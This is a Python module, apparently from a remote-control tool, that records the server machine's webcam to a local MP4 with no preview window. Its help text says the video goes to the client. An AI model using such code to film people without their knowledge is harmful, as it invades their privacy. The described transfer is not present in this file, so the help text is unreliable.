import numpy as np
import cv2
from apps.server.modules.libs.mod_interface import mod_interface


class mod_video(mod_interface):

    cmd_short = "vd"
    cmd_long = "video"
    cmd_desc = "Video module"

    def setup_mod(self):
        print(f'Module Setup (mod_video) called successfully!')

    def run_mod(self, cmd=""):
        print(f'Video Module')

        cap = cv2.VideoCapture(0)  # Capture video from camera

        # Get the width and height of frame
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) + 0.5)
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) + 0.5)

        # Define the codec and create VideoWriter object
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Be sure to use the lower case
        out = cv2.VideoWriter('./tmp/output.mp4', fourcc, 20.0, (width, height))

        while (cap.isOpened()):
            ret, frame = cap.read()
            if ret == True:
                # frame = cv2.flip(frame, 0)

                # write the flipped frame
                out.write(frame)

                # cv2.imshow('frame', frame)
                if (cv2.waitKey(1) & 0xFF) == ord('q'):  # Hit `q` to exit
                    break
            else:
                break

        # Release everything if job is finished
        out.release()
        cap.release()
        cv2.destroyAllWindows()

    def mod_helptxt(self):
        help_txt = {
            'desc': self.pritify4log("The 'Video' module records a video sequence\n"
                                     "with the servers webcam and transfers it to the\n"
                                     "client where it will be saved."),
            'cmd': 'vd',
            'ext': 'This command has no arguments'
        }
        return help_txt
